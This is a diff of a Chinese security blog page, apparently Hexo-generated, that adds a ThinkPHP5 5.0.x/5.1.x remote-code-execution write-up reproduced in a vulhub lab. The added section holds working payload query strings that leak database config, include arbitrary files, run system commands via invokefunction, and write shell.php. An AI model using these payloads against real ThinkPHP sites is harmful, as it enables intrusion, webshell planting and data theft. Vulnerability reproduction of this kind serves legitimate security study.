@@ -363,9 +363,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/thinkphp/">
+                                <span class="chip bg-color">thinkphp</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -391,7 +395,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    113
+                    354
                 </div>
                 
 
@@ -418,9 +422,22 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致rce</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22<br>5.1.0-5.1.30</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
+                <h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>因为框架对传入的路由参数过滤不严格，没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以操作非预期的控制器类执行任意方法，从而导致rce</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.0.5-5.0.22（5.0.x）<br>5.1.0-5.1.30（5.1.x）</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>5.0.x</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+
+
+<p>5.1.x</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>vulhub thinkphp 5-rce</p>
+<p><img src="https://i.loli.net/2021/10/25/uE87XZ3adiMRgbQ.png" alt="image-20211025133109582"></p>
+<p>直接使用5.0.x的poc触发漏洞</p>
+<p><img src="https://i.loli.net/2021/10/25/ELWkrRx1dB5QzA2.png" alt="image-20211025163444666"></p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252811#h3-7">ThinkPHP V5 漏洞复现</a></p>
 
@@ -486,7 +503,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/thinkphp/">
+                                    <span class="chip bg-color">thinkphp</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -563,6 +584,14 @@
                 </div>
 
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/thinkphp/">
+                        <span class="chip bg-color">thinkphp</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -575,9 +604,9 @@
                 <a href="/2021/10/20/thinkphp-5-0-23-rce/">
                     <div class="card-image">
                         
-                        <img src="/images/thinkphp5.png" class="responsive-img" alt="thinkphp 5.0.23-rce">
+                        <img src="/images/thinkphp5.png" class="responsive-img" alt="thinkphp 5.0.23-rce （核心类 Request rce）">
                         
-                        <span class="card-title">thinkphp 5.0.23-rce</span>
+                        <span class="card-title">thinkphp 5.0.23-rce （核心类 Request rce）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -805,7 +834,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">28.8k</span>&nbsp;字
+                class="white-color">29.2k</span>&nbsp;字
             
             
             
